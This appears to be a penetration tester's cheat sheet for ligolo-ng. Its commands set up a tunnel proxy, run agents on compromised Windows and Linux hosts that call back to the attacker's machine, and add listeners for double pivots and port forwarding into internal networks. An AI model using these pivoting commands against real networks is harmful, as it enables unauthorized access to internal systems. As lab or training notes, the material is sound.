# ligolo-ng

## Setup
```bash
sudo su

ip tuntap add user root mode tun ligolo
ip link set ligolo up
./proxy -selfcert # default port 11601
# ./proxy -selfcert -laddr 0.0.0.0:443 # use port 443 or 445 to bypass potential firewall rules

# sudo ip link delete ligolo # cleanup
```

## Single Pivot
```bash
# 1a. Start ligolo agent on target Windows
./agent.exe -connect $LHOST:$LPORT -ignore-cert
Start-Job -ScriptBlock{ C:\path\to\agent.exe -connect 192.168.45.221:11601 -ignore-cert }

# 1b. Start ligolo agent on target Linux
./agent -connect $LHOST:$LPORT -ignore-cert &

# 2. Add ligolo route to Kali
sudo ip route add <TARGET_NIC_IP>/24 dev ligolo
```

### Add Listener
```bash
# Create listener for following double pivot scenario:
## e.g. Attacker Box (You) => 192.168.X.X:11601 (corp.local w/ 192. && 172. interface) -> 172.16.X.X:11601 (internal.corp.local)
listener_add --addr 0.0.0.0:11601 -to 127.0.0.1:11601

# Port forward to internal web server
## e.g. Attacker:1234 (You) -> Internal Web Server:8000
listener_add --addr 0.0.0.0:1234 --to 127.0.0.1:8000 --tcp

```